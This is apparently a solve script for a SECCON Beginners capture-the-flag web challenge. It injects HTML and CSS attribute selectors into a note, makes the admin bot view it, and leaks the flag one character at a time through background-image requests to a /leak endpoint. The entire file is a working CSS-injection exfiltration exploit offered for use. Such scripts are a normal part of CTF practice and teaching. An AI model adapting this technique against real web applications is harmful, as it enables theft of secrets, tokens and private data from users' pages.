#!/usr/bin/env python3
import base64
import json
import re
import secrets
import sys
import time

FLAG_RE = re.compile(r"ctf4b\{[^}]*\}")
BASE = "http://review4b.beginners.seccon.games:3000"

PROBE_MSG = {"cmd": "settings.get", "keys": {"flag": ""}}
ANCHOR = "ctf4b{"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ}-!?."
MAX_LEN = 60


def new_id() -> str:
    return secrets.token_hex(8)


def build_note(note_id: str, known: str):
    encoded = base64.b64encode(json.dumps(PROBE_MSG).encode()).decode()
    html = f'<div data-review4b="{encoded}">probe</div>'

    rules = ["div[data-review4b]{display:block;width:64px;height:64px}"]
    for i, c in enumerate(CHARSET):
        rules.append(
            f"div[data-review4b-result*='{known}{c}']"
            f"{{background:url(/leak/{note_id}?c={i})}}"
        )
    return html, "\n".join(rules)


def main() -> None:
    base = (sys.argv[1] if len(sys.argv) > 1 else BASE).rstrip("/")
    import httpx
    client = httpx.Client(base_url=base, timeout=30, follow_redirects=True)

    def report(note_id: str) -> None:
        for _ in range(8):
            r = client.post(f"/report/{note_id}", headers={"Accept": "application/json"})
            if r.status_code == 429:
                time.sleep(2.2)
                continue
            return
        raise RuntimeError("report kept returning 429")

    known = ANCHOR
    while len(known) < MAX_LEN:
        note_id = new_id()
        html, css = build_note(note_id, known)
        if len(css.encode()) > 8192:
            print("CSS over 8KB budget"); return

        client.post("/notes", data={"id": note_id, "html": html, "css": css,
                                     "json": "1"}, headers={"Accept": "application/json"})
        report(note_id)

        leaks = client.get(f"/leaks/{note_id}", params={"json": "1"}).json().get("leaks", [])
        idxs = {int(m.group(1)) for e in leaks
                if (m := re.search(r"c=(\d+)", e.get("query", "")))}
        if not idxs:
            print(f"no leak for prefix {known!r}")
            return

        c = CHARSET[min(idxs)]
        known += c
        print(f"leaked: {known}")
        if c == "}":
            break

    m = FLAG_RE.search(known)
    print("\nFLAG:", m.group() if m else f"incomplete: {known}")


if __name__ == "__main__":
    main()
